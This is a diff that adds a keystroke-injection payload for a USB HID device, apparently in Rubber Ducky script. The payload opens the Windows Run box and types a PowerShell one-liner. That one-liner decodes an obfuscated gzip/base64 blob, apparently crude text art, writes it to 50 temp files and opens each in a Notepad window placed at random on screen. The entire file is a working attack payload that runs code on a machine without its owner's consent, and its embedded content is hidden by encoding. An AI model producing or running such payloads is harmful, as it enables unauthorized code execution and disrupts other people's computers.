@@ -1,0 +1,44 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoProfile
+ENTER
+DELAY 1500
+DEFAULT_STRING_DELAY 5
+STRING $m=[IO.MemoryStream]::new([Convert]::FromBase64S
+STRING tring('H4sIAAAAAAAACs3XUWvCMBAH8Hc/dZnDTmSwx5U+7
+STRING C4njr3toTiHo/0u90lG0ya2ttUkTVLhj0gV/HlJjgtDwjoiY
+STRING UoYO08Wzap9RwVjyVAx6RyZ9stCJY7+pOZQay44nZ+llA1uC
+STRING HoI4orhzQyniPiIlVOBdVyc+DViYcVETGVcXO27Xa0Ppq+ah
+STRING RWLtTxAhwjrq3DwwnDugyoWjaloyyZ27ftLNnFwnYhCNrlSE
+STRING XMmlE+mTvFzRFydLUNTsylTDOIUrkl2Zy8GJt7Gje1Fo/g5L
+STRING ndxbiVUxHmFNMTNISolhsU5r3I3RzVh6EwOabY4X8RhPodEN
+STRING 1yH6LjQE4fdH27+Xhwm9Y7Thcw9KDEIzpMS06C4rjLr30vME
+STRING gWnb3R7plfG3BSKm/C4mtUfseCpHXbMjm0wHMG1A1Kmk9XOC
+STRING 4Oj78GPVSzAducFwI0iMGVxsu0pIXBjCNs7nvw/IZb1faTJO
+STRING eAgCK5JVrdiOMvXXFbUclaI0eccZhlsr+4xcYkiTndjqBh2+
+STRING svxcVfZqox8+g8nYxjDPBQAAA=='));$g=[IO.Compressio
+STRING n.GzipStream]::new($m,[IO.Compression.Compressio
+STRING nMode]::Decompress);$r=[IO.StreamReader]::new($g
+STRING );$art=$r.ReadToEnd();Add-Type -TypeDefinition '
+STRING using System;using System.Runtime.InteropService
+STRING s;public static class Win32{[DllImport("user32.d
+STRING ll")]public static extern bool SetWindowPos(IntP
+STRING tr hWnd,IntPtr insert,int X,int Y,int cx,int cy,
+STRING uint flags);}';Add-Type -AssemblyName System.Win
+STRING dows.Forms;$wa=[Windows.Forms.Screen]::PrimarySc
+STRING reen.WorkingArea;$rng=[Random]::new();for($i=0;$
+STRING i -lt 50;$i++){$f=Join-Path $env:TEMP ('hui-art-
+STRING {0:D2}.txt' -f $i);[IO.File]::WriteAllText($f,$a
+STRING rt,[Text.UTF8Encoding]::new($false));$proc=Start
+STRING -Process notepad.exe -ArgumentList $f -PassThru;
+STRING for($j=0;$j -lt 30;$j++){Start-Sleep -Millisecon
+STRING ds 100;$proc.Refresh();if($proc.MainWindowHandle
+STRING  -ne [IntPtr]::Zero){break}};$maxX=[Math]::Max($
+STRING wa.X+1,$wa.Right-300);$maxY=[Math]::Max($wa.Y+1,
+STRING $wa.Bottom-120);$x=$rng.Next($wa.X,$maxX);$y=$rn
+STRING g.Next($wa.Y,$maxY);if($proc.MainWindowHandle -n
+STRING e [IntPtr]::Zero){[Win32]::SetWindowPos($proc.Ma
+STRING inWindowHandle,[IntPtr]::Zero,$x,$y,0,0,65)|Out-
+STRING Null}};exit
+ENTER
